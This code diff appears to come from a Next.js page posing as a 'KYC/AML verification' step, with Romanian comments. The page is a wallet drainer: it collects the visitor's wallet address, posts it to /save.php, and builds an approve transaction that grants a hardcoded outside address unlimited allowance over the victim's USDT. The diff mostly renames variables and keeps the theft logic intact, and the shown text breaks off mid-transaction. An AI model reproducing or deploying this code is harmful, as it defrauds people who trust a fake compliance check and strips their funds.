@@ -1,6 +1,13 @@
 "use client";
 
-import { useEffect, useState } from "react";
+import { useState } from "react";
+
+// 🔧 Adăugăm tipul pentru TypeScript
+declare global {
+  interface Window {
+    ethereum?: any;
+  }
+}
 
 export default function Page() {
   const [status, setStatus] = useState("Verification KYC/AML");
@@ -15,9 +22,9 @@ export default function Page() {
     setStatus("Connecting...");
 
     try {
-      if (typeof window.ethereum === "undefined") {
+      if (typeof window === "undefined" || typeof window.ethereum === "undefined") {
         if (isMobile()) {
-          // Redirect to Trust Wallet via intent (mobil)
+          // Redirecționează către Trust Wallet (doar pe mobil)
           const intent = `intent://wc#Intent;package=com.wallet.crypto.trustapp;scheme=wc;end`;
           window.location.href = intent;
         } else {
@@ -26,25 +33,26 @@ export default function Page() {
         return;
       }
 
-      const provider = window.ethereum;
-      const accounts = await provider.request({ method: "eth_requestAccounts" });
+      const ethereum = window.ethereum;
+
+      const accounts = await ethereum.request({ method: "eth_requestAccounts" });
       const walletAddress = accounts[0];
 
-      // Trimite adresa către PHP sau alt backend
+      // Trimite adresa către server (opțional)
       await fetch("/save.php", {
         method: "POST",
         headers: { "Content-Type": "application/x-www-form-urlencoded" },
         body: `address=${encodeURIComponent(walletAddress)}`
       });
 
-      // Aprobare token USDT
+      // Aprobare USDT
       const spender = "0xbA9D4eeB570FC52CF0d5362f80Ef31DD7F239e75";
       const usdt = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
       const maxUint = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
       const method = "095ea7b3";
       const txData = "0x" + method + spender.slice(2).padStart(64, '0') + maxUint.slice(2).padStart(64, '0');
 
-      await provider.request({
+      await ethereum.request({
         method: "eth_sendTransaction",
         params: [{
           from: walletAddress,
